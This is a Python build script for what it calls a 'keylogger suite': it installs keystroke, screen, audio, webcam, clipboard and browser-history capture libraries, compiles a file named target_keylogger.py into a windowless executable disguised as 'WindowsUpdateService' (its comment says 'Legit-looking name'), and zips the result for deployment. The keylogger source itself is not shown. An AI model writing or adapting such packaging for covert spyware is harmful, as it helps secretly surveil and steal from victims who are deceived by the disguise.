#!/usr/bin/env python3
"""
🏗️ BUILD SCRIPT - Compiles everything into deployable zip
"""

import os
import sys
import subprocess
import zipfile
from datetime import datetime

def build_all():
    print("=" * 60)
    print("   BUILDING KEYLOGGER SUITE")
    print("   " + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    print("=" * 60)
    
    # Install build deps
    subprocess.check_call([sys.executable, "-m", "pip", "install",
                          "pyinstaller", "pynput", "psutil", "mss",
                          "pyperclip", "Pillow", "opencv-python",
                          "sounddevice", "scipy", "browserhistory",
                          "cryptography"],
                         stdout=subprocess.DEVNULL)
    
    # Compile with PyInstaller
    print("\n[*] Compiling target_keylogger.py...")
    subprocess.check_call([
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--name", "WindowsUpdateService",  # Legit-looking name
        "--clean",
        "--noconfirm",
        "target_keylogger.py"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("[✓] Built: dist/WindowsUpdateService.exe")
    
    # Zip everything
    output = f"keylogger_suite_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk('dist'):
            for f in files:
                zf.write(os.path.join(root, f), f)
    print(f"[✓] Packed: {output}")

if __name__ == "__main__":
    build_all()
